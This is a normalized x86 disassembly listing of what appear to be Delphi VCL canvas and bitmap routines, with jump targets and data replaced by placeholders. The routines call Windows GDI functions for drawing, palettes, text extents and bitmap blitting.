call sub_425354
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424fe0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42503c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425078
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404178
push eax
mov eax edi
call sub_404378
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4250bc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425078
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4250d8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425078
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4250f8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_425144
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42514b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424f1c
sub_4251a4
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4251c8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424f44
pop ecx
pop edx
pop edi
pop esi
retn
sub_4251e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_425214
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov eax [ ebp + 0x8 ]
call sub_423dac
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42525c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_4252a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_425300
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4252a0
mov edx esp
mov eax ebx
call sub_4251a4
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4251c8
sub_425354
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4253f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
test bl 0x8
je r-xdata
mov eax esi
call sub_42541c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_42544c
sub_4253f0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_424280
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_42541c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_424780
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_42544c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424a6c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424a6c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424b4c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424a30
call sub_423dac
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_42557c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4255c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255cd
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_4255d0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_42566c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_42557c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404128
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425673
lea eax [ ebp - 0x104 ]
call sub_403eb8
retn
sub_425688
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4257d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425745
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4255d0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4255d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257dd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_4257e8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_42581c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425a9c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425678
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425aa3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push sub_440328
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425678
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4258ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406b48
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425aa3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425ab0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425ae8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b34
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425b60
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_425bb8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425cb5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425cbc
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_425cd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_425d56
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425d68
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425b60
mov eax esp
call sub_425cd0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425e0c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425b60
mov [ esp ] eax
sub_425e60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425808
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4257e8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42600c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425678
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425f32
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425688
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f39
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_42557c
sub_425f39
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425808
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425678
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425688
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ff3
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_426028
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4260b8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407cd4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4263af
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4261a1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_42557c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261a8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4261a8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_42601c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
